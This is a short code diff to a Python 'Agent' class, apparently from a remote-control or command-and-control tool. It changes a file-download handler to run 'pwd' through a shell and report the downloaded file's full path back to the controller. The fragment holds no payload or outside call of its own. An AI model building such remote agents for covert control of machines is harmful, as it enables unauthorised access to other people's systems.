@@ -178,7 +178,20 @@ class Agent(object):
                 for chunk in req.iter_content(chunk_size=8000):
                     if chunk:
                         f.write(chunk)
-            self.send_output("[+] File downloaded: " + destination)
+
+            # For getting real local path on the agent:
+            pre_path = ''
+
+            try:
+                proc = subprocess.Popen("pwd", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                out, err = proc.communicate()
+                pre_path = (out + err)
+            except Exception as exc:
+                pre_path = '<Error getting path>'
+
+            pre_path = pre_path.split('\n')[0]
+            
+            self.send_output("[+] File downloaded: " + pre_path + "/" + destination)
         except Exception as exc:
             self.send_output(traceback.format_exc())
 
